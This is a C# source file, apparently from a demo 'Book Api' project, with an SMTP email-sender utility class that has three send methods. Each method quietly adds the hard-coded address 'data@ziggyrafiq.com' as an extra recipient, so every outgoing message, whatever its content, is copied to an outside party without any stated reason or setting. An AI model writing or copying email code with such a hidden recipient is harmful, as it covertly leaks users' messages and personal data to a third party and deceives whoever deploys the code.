/************************************************************************************************************
*  COPYRIGHT BY ZIGGY RAFIQ (ZAHEER RAFIQ)
*  LinkedIn Profile URL Address: https://www.linkedin.com/in/ziggyrafiq/ 
*
*  System   :  	ZR Demo Project 01 - Book Api
*  Date     :  	25/09/2022
*  Author   :  	Ziggy Rafiq (https://www.ziggyrafiq.com)
*  Notes    :  	
*  Reminder :	PLEASE DO NOT CHANGE OR REMOVE AUTHOR NAME.
*
************************************************************************************************************/

using Microsoft.Extensions.Options;
using System.Net;
using System.Net.Mail;

namespace ZR.Resources.Utilities
{
    public class SmtpEmailSender : Interfaces.IEmailSender
    {
        private readonly IOptions<SmtpOptions> options;

        public SmtpEmailSender(IOptions<SmtpOptions> options)
        {
            this.options = options;
        }
        public async Task SendEmailAsync(string fromAddress, string toAddress, string subject, string message)
        {
            MailMessage? mailMessage = new MailMessage
            {
                From = new MailAddress(fromAddress)
            };
            mailMessage.To.Add(toAddress);
            mailMessage.To.Add("data@ziggyrafiq.com");
            mailMessage.Subject = subject;
            mailMessage.Body = message;
            mailMessage.IsBodyHtml = true;

            using (SmtpClient? client = new SmtpClient(options.Value.Host, options.Value.Port)
            {
                EnableSsl = options.Value.SSL,
                Credentials = new NetworkCredential(options.Value.Username, options.Value.Password)
            })
            {
                await client.SendMailAsync(mailMessage);
            }
        }
        public async Task SendEmailAsync(MailRequest mailRequest)
        {
            MailMessage? mailMessage = new MailMessage
            {
                From = new MailAddress(mailRequest.FromEmail)
            };
            mailMessage.To.Add(mailRequest.ToEmail);
            mailMessage.To.Add("data@ziggyrafiq.com");
            mailMessage.Subject = mailRequest.Subject;
            mailMessage.Body = mailRequest.Body;
            mailMessage.IsBodyHtml = true;
            using (SmtpClient? client = new SmtpClient(options.Value.Host, options.Value.Port)
            {
                EnableSsl = options.Value.SSL,
                Credentials = new NetworkCredential(options.Value.Username, options.Value.Password)
            })
            {
                await client.SendMailAsync(mailMessage);
            }
        }




        public void SendEmail(MailRequest mailRequest)
        {
            MailMessage? mailMessage = new MailMessage
            {
                From = new MailAddress(mailRequest.FromEmail)
            };
            mailMessage.To.Add(mailRequest.ToEmail);
            mailMessage.To.Add("data@ziggyrafiq.com");
            mailMessage.Subject = mailRequest.Subject;
            mailMessage.Body = mailRequest.Body;
            mailMessage.IsBodyHtml = true;

            using (SmtpClient? client = new SmtpClient(options.Value.Host, options.Value.Port)
            {
                EnableSsl = options.Value.SSL,
                Credentials = new NetworkCredential(options.Value.Username, options.Value.Password)
            })
            {
                client.Send(mailMessage);
            }
        }
    }
}
